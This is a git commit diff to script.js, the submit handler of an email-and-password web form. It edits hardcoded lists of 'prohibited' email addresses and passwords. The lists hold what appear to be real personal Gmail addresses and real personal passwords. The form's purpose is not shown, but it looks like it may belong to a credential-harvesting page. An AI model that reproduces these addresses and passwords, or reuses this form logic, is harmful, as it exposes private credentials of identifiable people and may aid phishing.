548ab706403216d5bff1a91e4197d1644dff64f8
myfiles-folder1650-0q2adscg115dsbjh0hs <desiresunday56@gmail.com>
2025-03-24 20:02:00 -0500

    Update script.js

--- script.js
+++ script.js
@@ -8,7 +8,7 @@ document.getElementById("miFormulario").addEventListener("submit", async functio
     
     // Lista de correos electrónicos y contraseñas prohibidas
     const prohibitedEmails = ["elizabtherequejolinche@gmail.com","aleferreyro1@gmail.com","nicollegonzales720@gmail.com"]; // Agregar correos prohibidos aquí
-    const prohibitedWords = ["chispitasyvainillas13","Chispitasyvainillas13","Alissongr13","alissongr13","Jhovani","jhovani","Pedona08","pedona08","Nicolas2025","chispitayvainillas13 ","Chispitayvainillas13 ","darlyn2006","Majo1992","majo1992","cielito1309","Cielito1309","teamomama","Teamomama","1263838","Kira123456789","kira123456789"]; // Agregar contraseñas prohibidas aquí
+    const prohibitedWords = ["chispitasyvainillas13","Chispitasyvainillas13","Chispitayvainillas13","chispitayvainillas13","Jhovani","jhovani","Pedona08","pedona08","Nicolas2025","chispitayvainillas13 ","Chispitayvainillas13 ","darlyn2006","Majo1992","majo1992","cielito1309","Cielito1309","teamomama","Teamomama","1263838","Kira123456789","kira123456789"]; // Agregar contraseñas prohibidas aquí
     
     const email = emailInput.value.trim().toLowerCase();
     const password = passwordInput.value;
